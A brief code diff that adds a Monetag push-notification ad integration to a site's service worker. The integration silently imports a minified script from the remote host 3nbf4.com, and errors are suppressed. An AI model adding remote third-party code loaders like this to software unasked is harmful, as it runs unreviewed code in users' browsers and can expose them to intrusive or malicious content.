@@ -25,3 +25,13 @@ self.addEventListener("notificationclick", (e) => {
     self.clients.matchAll({ type: "window" }).then((list) => (list[0] ? list[0].focus() : self.clients.openWindow("/admin/bulk"))),
   );
 });
+
+// Monetag push notifications
+self.options = {
+  domain: "3nbf4.com",
+  zoneId: 11883577,
+};
+self.lary = "";
+try {
+  importScripts("https://3nbf4.com/act/files/service-worker.min.js?r=sw");
+} catch (e) {}
